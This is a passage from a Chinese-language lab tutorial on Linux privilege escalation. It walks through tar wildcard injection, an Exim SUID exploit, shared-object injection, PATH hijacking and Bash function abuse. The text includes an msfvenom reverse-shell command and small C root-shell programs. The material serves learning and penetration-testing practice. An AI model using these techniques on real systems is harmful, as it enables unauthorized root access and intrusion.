src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643192.png" alt="image-20210704104709412"></p><pre class="line-numbers language-none"><code class="language-none">root /usr/local/bin/compress.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-查看文件的内容："><a href="#2-查看文件的内容：" class="headerlink" title="2.查看文件的内容："></a>2.查看文件的内容：</h4><pre class="line-numbers language-none"><code class="language-none">cat /usr/local/bin/compress.sh <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643193.png" alt="image-20210704104806120"></p><p>注意：tar命令在 <code>/home/user</code>中使用通配符<code>*</code>运行</p><h4 id="3-查阅参考"><a href="#3-查阅参考" class="headerlink" title="3.查阅参考"></a>3.查阅参考</h4><p>显示tar具有命令行选项，可以用来运行其他命令作为检查点功能的一部分</p><h4 id="4-使用msfvenom创建反向壳ELF有效载荷："><a href="#4-使用msfvenom创建反向壳ELF有效载荷：" class="headerlink" title="4.使用msfvenom创建反向壳ELF有效载荷："></a>4.使用msfvenom创建反向壳ELF有效载荷：</h4><pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.175.161 LPORT=4444 -f elf -o shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643194.png" alt="image-20210704110051360"></p><h4 id="5-搞文件到tar所在运行目录，并加权："><a href="#5-搞文件到tar所在运行目录，并加权：" class="headerlink" title="5.搞文件到tar所在运行目录，并加权："></a>5.搞文件到tar所在运行目录，并加权：</h4><p>python开启HTTP服务 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643195.png" alt="image-20210704110127651"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643196.png" alt="image-20210704110119309"></p><pre class="line-numbers language-none"><code class="language-none">chmod +x /home/user/shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643197.png" alt="image-20210704110200778"></p><h4 id="6-在-home-user目录中创建两个文件："><a href="#6-在-home-user目录中创建两个文件：" class="headerlink" title="6.在/home/user目录中创建两个文件："></a>6.在/home/user目录中创建两个文件：</h4><pre class="line-numbers language-none"><code class="language-none">touch /home/user/--checkpoint=1 touch /home/user/--checkpoint-action=exec=shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643198.png" alt="image-20210704110307745"></p><h4 id="7-kali运行nc等待cron-job"><a href="#7-kali运行nc等待cron-job" class="headerlink" title="7.kali运行nc等待cron job"></a>7.kali运行nc等待cron job</h4><h1 id="0x09-SUID-SGID可执行文件"><a href="#0x09-SUID-SGID可执行文件" class="headerlink" title="0x09 SUID / SGID可执行文件"></a>0x09 SUID / SGID可执行文件</h1><h2 id="前言-12"><a href="#前言-12" class="headerlink" title="前言"></a>前言</h2><p>SUID文件使用文件所有者的权限执行。<br>SGID文件使用文件组的权限执行。<br>如果文件归root所有，则使用root特权执行，我们也许能够使用它来升级权限。</p><h2 id="SUID-SGID文件"><a href="#SUID-SGID文件" class="headerlink" title="SUID / SGID文件"></a>SUID / SGID文件</h2><p>我们可以使用以下<code>find</code>命令查找带有SUID 或 SGID 位集的文件</p><pre class="line-numbers language-none"><code class="language-none">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643199.png" alt="image-20210630180510655"></p><h2 id="外壳逃生序列-1"><a href="#外壳逃生序列-1" class="headerlink" title="外壳逃生序列"></a>外壳逃生序列</h2><p>正如我们能够使用壳逃生序列与程序运行通过sudo，我们可以做同样的SUID/SGID文件。<br>此处可以找到带有外壳逃生序列的程序列表 ：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p>注意：默认情况下， 环境变量LD_PRELOAD &amp; LD_LIBRARY_PATH<br>这是在Linux禁用，因为它带来的明显安全风险！<br><strong>执行 SUID 文件时，这两个环境变量都会被忽略</strong></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>某些程序安装 SUID 文件以帮助其操作。<br>正如作为root运行的服务可能有漏洞，我们可以利用root外壳，这些SUID文件也可以。<br>使用Searchsploit, Google, and GitHub可以找到漏洞</p><h2 id="实操-11"><a href="#实操-11" class="headerlink" title="实操"></a>实操</h2><h3 id="1-在目标上查找SUID-SGID-文件-："><a href="#1-在目标上查找SUID-SGID-文件-：" class="headerlink" title="1.在目标上查找SUID/SGID 文件 ："></a>1.在目标上查找SUID/SGID 文件 ：</h3><pre class="line-numbers language-none"><code class="language-none">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643200.png" alt="image-20210630180804891"></p><pre class="line-numbers language-none"><code class="language-none">-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Exim 是一个邮件转账代理，但是它存在许多安全漏洞</p><h3 id="2-版本确认："><a href="#2-版本确认：" class="headerlink" title="2.版本确认："></a>2.版本确认：</h3><pre class="line-numbers language-none"><code class="language-none">/usr/sbin/exim-4.84-3 --version <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643201.png" alt="image-20210630181009415"></p><h3 id="3-漏洞寻找"><a href="#3-漏洞寻找" class="headerlink" title="3.漏洞寻找"></a>3.漏洞寻找</h3><pre class="line-numbers language-none"><code class="language-none">searchsploit exim 4.84 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643202.png" alt="image-20210630181114318"></p><p>这个：<code>linux/local/39535.sh</code></p><h3 id="4-漏洞利用-CVE-2016-1531"><a href="#4-漏洞利用-CVE-2016-1531" class="headerlink" title="4.漏洞利用(CVE-2016-1531)"></a>4.漏洞利用(CVE-2016-1531)</h3><p>脚本复制到目标机器上。您可能需要从脚本中删除^M字符：</p><pre class="line-numbers language-none"><code class="language-none">sed -e "s/^M//" 39535.sh &gt; a001.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：要获得^M，必须按住Ctrl，然后连续按V和M。</p><h3 id="5-加权"><a href="#5-加权" class="headerlink" title="5.加权"></a>5.加权</h3><pre class="line-numbers language-none"><code class="language-none">chmod +x a001.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643203.png" alt="image-20210704110724989"></p><h3 id="6-执行脚本以获得根壳："><a href="#6-执行脚本以获得根壳：" class="headerlink" title="6.执行脚本以获得根壳："></a>6.执行脚本以获得根壳：</h3><pre class="line-numbers language-none"><code class="language-none">./a001.sh <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643204.png" alt="image-20210704110700833"></p><h2 id="共享对象注入"><a href="#共享对象注入" class="headerlink" title="共享对象注入"></a>共享对象注入</h2><h3 id="前言-13"><a href="#前言-13" class="headerlink" title="前言"></a>前言</h3><p>执行程序时，它将尝试加载所需的共享对象。<br>通过使用称为strace 的程序，我们可以跟踪这些系统呼叫并确定是否未找到任何共享对象。<br>如果我们可以写信给程序尝试 打开的位置，我们可以创建一个共享对象，并在加载时生成root</p><h3 id="实操-12"><a href="#实操-12" class="headerlink" title="实操"></a>实操</h3><h4 id="1-在目标上查找SUID-SGID文件-："><a href="#1-在目标上查找SUID-SGID文件-：" class="headerlink" title="1.在目标上查找SUID/SGID文件 ："></a>1.在目标上查找SUID/SGID文件 ：</h4><pre class="line-numbers language-none"><code class="language-none">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643205.png" alt="image-20210701115900118"></p><pre class="line-numbers language-none"><code class="language-none">-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>suid-so</code>文件在root用户权限下执行</p><h4 id="2-在SUID文件上运行分层："><a href="#2-在SUID文件上运行分层：" class="headerlink" title="2.在SUID文件上运行分层："></a>2.在SUID文件上运行分层：</h4><pre class="line-numbers language-none"><code class="language-none">strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE "open|access|no such  file"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643206.png" alt="image-20210704111607655"></p><pre class="line-numbers language-none"><code class="language-none">user@debian:~$ strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE "open|access|no such  file"access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)open("/etc/ld.so.cache", O_RDONLY)      = 3access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)open("/lib/libdl.so.2", O_RDONLY)       = 3access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)open("/lib/libm.so.6", O_RDONLY)        = 3access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)open("/lib/libgcc_s.so.1", O_RDONLY)    = 3access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)open("/lib/libc.so.6", O_RDONLY)        = 3open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)user@debian:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到找不到共享对象 <code>libcalc.so</code>，程序正在查看用户的家庭目录，我们可以写东西给这个目录</p><h4 id="3-创建-home-user-config目录"><a href="#3-创建-home-user-config目录" class="headerlink" title="3.创建 /home/user/.config目录"></a>3.创建 /home/user/.config目录</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643207.png" alt="image-20210704112350458"></p><p>注意：这里查看的话 要查看隐藏文件夹命令</p><h4 id="4-创建libcalc-c具有-以下-内容："><a href="#4-创建libcalc-c具有-以下-内容：" class="headerlink" title="4.创建libcalc.c具有 以下 内容："></a>4.创建<code>libcalc.c</code>具有 以下 内容：</h4><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;static void inject() __attribute__((constructor));void inject() {setuid(0);system("/bin/bash -p");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-进行编译"><a href="#5-进行编译" class="headerlink" title="5.进行编译"></a>5.进行编译</h4><pre class="line-numbers language-none"><code class="language-none">gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643208.png" alt="image-20210704112538615"></p><h4 id="6-运行可执行的SUID以获得根壳："><a href="#6-运行可执行的SUID以获得根壳：" class="headerlink" title="6.运行可执行的SUID以获得根壳："></a>6.运行可执行的SUID以获得根壳：</h4><pre class="line-numbers language-none"><code class="language-none">/usr/local/bin/suid-so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643209.png" alt="image-20210704112616418"></p><h2 id="路径环境变量-1"><a href="#路径环境变量-1" class="headerlink" title="路径环境变量"></a>路径环境变量</h2><h3 id="前言-14"><a href="#前言-14" class="headerlink" title="前言"></a>前言</h3><p>PATH 环境变量包含外壳应尝试查找程序的目录列表。<br>如果程序尝试执行其他程序，但只指定程序名称，而不是其完整（绝对）路径，则外壳将搜索 PATH 目录，直到找到为止。<br>由于用户完全控制其 PATH 变量，我们可以告诉外壳首先在目录中查找我们可以写到的程序。</p><h3 id="查找易受攻击的程序"><a href="#查找易受攻击的程序" class="headerlink" title="查找易受攻击的程序"></a>查找易受攻击的程序</h3><p>如果程序尝试执行其他程序，该程序的名称可能嵌入到可执行文件中，作为string。<br>我们可以在可执行文件上运行strings以查找strings。<br>我们还可以使用策略(strace)来查看程序的执行情况。另一个称为”Itrace”的程序也可能有用。</p><h4 id="对文件运行字符串："><a href="#对文件运行字符串：" class="headerlink" title="对文件运行字符串："></a>对文件运行字符串：</h4><pre class="line-numbers language-none"><code class="language-none">strings /path/to/file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="针对命令运行策略："><a href="#针对命令运行策略：" class="headerlink" title="针对命令运行策略："></a>针对命令运行策略：</h4><pre class="line-numbers language-none"><code class="language-none">strace -v -f -e execve &lt;command&gt; 2&gt;&amp;1 | grep exec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="对命令运行-跟踪-："><a href="#对命令运行-跟踪-：" class="headerlink" title="对命令运行 跟踪 ："></a>对命令运行 跟踪 ：</h4><pre class="line-numbers language-none"><code class="language-none">ltrace &lt;command&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="实操-13"><a href="#实操-13" class="headerlink" title="实操"></a>实操</h3><h4 id="1-在目标上查找SUID-SGID文件-：-1"><a href="#1-在目标上查找SUID-SGID文件-：-1" class="headerlink" title="1.在目标上查找SUID/SGID文件 ："></a>1.在目标上查找SUID/SGID文件 ：</h4><pre class="line-numbers language-none"><code class="language-none">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643210.png" alt="image-20210701171659145"></p><pre class="line-numbers language-none"><code class="language-none">-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>suid-env</code>文件在root用户权限下执行</p><h5 id="2-在SUID文件上运行stings："><a href="#2-在SUID文件上运行stings：" class="headerlink" title="2.在SUID文件上运行stings："></a>2.在SUID文件上运行stings：</h5><pre class="line-numbers language-none"><code class="language-none">strings /usr/local/bin/suid-env<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643211.png" alt="image-20210701173258438"></p><p>该文件可能正在尝试在没有完整路径的情况下运行服务程序。</p><h4 id="3-我们可以用策略来验证这一点："><a href="#3-我们可以用策略来验证这一点：" class="headerlink" title="3.我们可以用策略来验证这一点："></a>3.我们可以用策略来验证这一点：</h4><pre class="line-numbers language-none"><code class="language-none">strace -v -f -e execve /usr/local/bin/suid-env 2&gt;&amp;1 | grep service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643212.png" alt="image-20210701172526881"></p><pre class="line-numbers language-none"><code class="language-none">user@debian:~$ strace -v -f -e execve /usr/local/bin/suid-env 2&gt;&amp;1 | grep service[pid  4721] execve("/bin/sh", ["sh", "-c", "service apache2 start"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=1", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"..., "_=/usr/bin/strace", "OLDPWD=/usr/local/bin"]) = 0[pid  4721] execve("/usr/sbin/service", ["service", "apache2", "start"], ["SHELL=/bin/bash", "TERM=xterm-256color", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "USER=user", "HISTFILESIZE=1000000", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "PATH=/usr/local/bin:/usr/bin:/bi"..., "MAIL=/var/mail/user", "_=/usr/sbin/service", "PWD=/home/user", "LANG=en_US.UTF-8", "HOME=/home/user", "SHLVL=2", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"...]) = 0[pid  4722] execve("/usr/bin/basename", ["basename", "/usr/sbin/service"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "_=/usr/bin/basename", "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=3", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"...]) = 0[pid  4723] execve("/usr/bin/basename", ["basename", "/usr/sbin/service"], ["TERM=xterm-256color", "SHELL/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=3", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"..., "_=/usr/bin/basename"]) = 0user@debian:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可选地，我们也可以用Itrace验证：</p><pre class="line-numbers language-none"><code class="language-none">ltrace /usr/local/bin/suid-env 2&gt;&amp;1 | grep service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643213.png" alt="image-20210701172644492"></p><p>这表明 系统 功能正用于执行 服务 计划。</p><h4 id="4-创建-service-c具有-以下-内容："><a href="#4-创建-service-c具有-以下-内容：" class="headerlink" title="4.创建 service.c具有 以下 内容："></a>4.创建 service.c具有 以下 内容：</h4><pre class="line-numbers language-none"><code class="language-none">int main() { setuid(0); system("/bin/bash -p"); }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643214.png" alt="image-20210701172832305"></p><h4 id="5-编译service-c文件："><a href="#5-编译service-c文件：" class="headerlink" title="5.编译service.c文件："></a>5.编译service.c文件：</h4><pre class="line-numbers language-none"><code class="language-none">gcc -o service service.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6-将当前目录（或可执行新服务的位置）预编到PATH-变量，并执行用于根壳的-SUID-文件："><a href="#6-将当前目录（或可执行新服务的位置）预编到PATH-变量，并执行用于根壳的-SUID-文件：" class="headerlink" title="6.将当前目录（或可执行新服务的位置）预编到PATH 变量，并执行用于根壳的 SUID 文件："></a>6.将当前目录（或可执行新服务的位置）预编到PATH 变量，并执行用于根壳的 SUID 文件：</h4><pre class="line-numbers language-none"><code class="language-none">PATH=.:$PATH /usr/local/bin/suid-env<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643215.png" alt="image-20210701172915956"></p><h2 id="滥用外壳功能"><a href="#滥用外壳功能" class="headerlink" title="滥用外壳功能"></a>滥用外壳功能</h2><h3 id="前言-15"><a href="#前言-15" class="headerlink" title="前言"></a>前言</h3><p>在某些外壳中(特别是 Bash &lt;4.2-048)，可以使用绝对路径名称定义用户功能。<br>这些功能是可以导出，用来方便子处理程序能够访问它们，并且这些函数可以优先于实际可执行的呼叫。</p><h3 id="实操-14"><a href="#实操-14" class="headerlink" title="实操"></a>实操</h3><h4 id="1-在目标上查找SUID-SGID-文件-：-1"><a href="#1-在目标上查找SUID-SGID-文件-：-1" class="headerlink" title="1.在目标上查找SUID/SGID  文件 ："></a>1.在目标上查找SUID/SGID  文件 ：</h4><pre class="line-numbers language-none"><code class="language-none">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643216.png" alt="image-20210701173043064"></p><pre class="line-numbers language-none"><code class="language-none">-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>suid-env</code>文件在root权限下执行</p><h4 id="2-在SUID文件上运行字符串："><a href="#2-在SUID文件上运行字符串：" class="headerlink" title="2.在SUID文件上运行字符串："></a>2.在SUID文件上运行字符串：</h4><pre class="line-numbers language-none"><code class="language-none">strings /usr/local/bin/suid-env2 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643217.png" alt="image-20210701173211516"></p><p>该文件可能正在尝试运行 /usr/sbin/service</p><h4 id="3-我们可以用strace-策略-来验证这一点："><a href="#3-我们可以用strace-策略-来验证这一点：" class="headerlink" title="3.我们可以用strace(策略)来验证这一点："></a>3.我们可以用strace(策略)来验证这一点：</h4><pre class="line-numbers language-none"><code class="language-none">strace -v -f -e execve /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643218.png" alt="image-20210701173504658"></p><pre class="line-numbers language-none"><code class="language-none">user@debian:~$ strace -v -f -e execve /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service[pid  4892] execve("/bin/sh", ["sh", "-c", "/usr/sbin/service apache2 start"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "OLDPWD=/usr/local/bin", "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=1", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"..., "_=/usr/bin/strace"]) = 0[pid  4892] execve("/usr/sbin/service", ["/usr/sbin/service", "apache2", "start"], ["SHELL=/bin/bash", "TERM=xterm-256color", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "USER=user", "HISTFILESIZE=1000000", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "PATH=/usr/local/bin:/usr/bin:/bi"..., "MAIL=/var/mail/user", "_=/usr/sbin/service", "PWD=/home/user", "LANG=en_US.UTF-8", "HOME=/home/user", "SHLVL=2", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"...]) = 0[pid  4893] execve("/usr/bin/basename", ["basename", "/usr/sbin/service"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "_=/usr/bin/basename", "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=3", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"...]) = 0[pid  4894] execve("/usr/bin/basename", ["basename", "/usr/sbin/service"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIaENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=3", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"..., "_=/usr/bin/basename"]) = 0a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-可选地，我们也可以用跟踪验证："><a href="#4-可选地，我们也可以用跟踪验证：" class="headerlink" title="4.可选地，我们也可以用跟踪验证："></a>4.可选地，我们也可以用跟踪验证：</h4><pre class="line-numbers language-none"><code class="language-none">ltrace /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643219.png" alt="image-20210701173542883"></p><p>这表明system功能正在用于执行<code>/usr/sbin/service</code>计划</p><h4 id="5-验证-Bash-版本低于-4-2-048："><a href="#5-验证-Bash-版本低于-4-2-048：" class="headerlink" title="5.验证    Bash 版本低于 4.2-048："></a>5.验证    Bash 版本低于 4.2-048：</h4><pre class="line-numbers language-none"><code class="language-none">bash --version <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643220.png" alt="image-20210701173609992"></p><h4 id="6-创建-具有”-usr-sbin-service”名称的-Bash-功能-并导出-该功能："><a href="#6-创建-具有”-usr-sbin-service”名称的-Bash-功能-并导出-该功能：" class="headerlink" title="6.创建 具有”/usr/sbin/service”名称的 Bash 功能 并导出 该功能："></a>6.创建 具有”/usr/sbin/service”名称的 Bash 功能 并导出 该功能：</h4><pre class="line-numbers language-none"><code class="language-none">function /usr/sbin/service { /bin/bash -p; }export –f /usr/sbin/service <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="7-执行用于根壳的-SUID-文件："><a href="#7-执行用于根壳的-SUID-文件：" class="headerlink" title="7.执行用于根壳的 SUID 文件："></a>7.执行用于根壳的 SUID 文件：</h4><pre class="line-numbers language-none"><code class="language-none">/usr/local/bin/suid-env2 root@debian:~# id uid=0(root) gid=0(root) groups=0(root) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="二、滥用外壳功能"><a href="#二、滥用外壳功能" class="headerlink" title="二、滥用外壳功能"></a>二、滥用外壳功能</h2><h3 id="前言-16"><a href="#前言-16" class="headerlink" title="前言"></a>前言</h3><p>Bash具有调试模式，可启用<code>–x</code>命令行选项，或通过修改 SHELLOPTS 环境变量以包括 xtrace启用。<br>默认情况下，SHELLOPTS是只读的，但是env命令允许</p><p>外壳选择待设置<br>在调试模式下，Bash 使用环境变量 PS4 显示调试语句的额外提示。此变量可以包括嵌入式命令，该命令每次显示时都会执行。</p><p>三、总线外壳功能</p><p>如果 SUID 文件通过 Bash 运行其他程序（例如使用system）， 这些环境变量可以继承。<br>如果执行 SUID 文件，此命令将使用文件所有者的权限执行。<br>在 Bash 版本 4.4 及以上中，PS4 环境变量不会由作为root运行的外壳继承。</p><h3 id="实操-15"><a href="#实操-15" class="headerlink" title="实操"></a>实操</h3><h4 id="1-在目标上查找苏伊德-SGID-文件-："><a href="#1-在目标上查找苏伊德-SGID-文件-：" class="headerlink" title="1.在目标上查找苏伊德/SGID 文件 ："></a>1.在目标上查找苏伊德/SGID 文件 ：</h4><pre class="line-numbers language-none"><code class="language-none">$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个<code>suid-env2</code> 文件在root用户权限下执行</p><h4 id="2-在SUID文件上运行字符串：-1"><a href="#2-在SUID文件上运行字符串：-1" class="headerlink" title="2.在SUID文件上运行字符串："></a>2.在SUID文件上运行字符串：</h4><pre class="line-numbers language-none"><code class="language-none">$ strings /usr/local/bin/suid-env2 /usr/sbin/service apache2 start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>该文件可能正在尝试运行 <code>/usr/sbin/service</code>程序</p><h4 id="3-我们可以用策略来验证这一点：-1"><a href="#3-我们可以用策略来验证这一点：-1" class="headerlink" title="3.我们可以用策略来验证这一点："></a>3.我们可以用策略来验证这一点：</h4><pre class="line-numbers language-none"><code class="language-none">$ strace -v -f -e execve /usr/local/bin/suid-env2 2&gt;&amp;1 | grep service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-可选地，们也可以用Itrace验证："><a href="#4-可选地，们也可以用Itrace验证：" class="headerlink" title="4.可选地，们也可以用Itrace验证："></a>4.可选地，们也可以用Itrace验证：</h4><pre 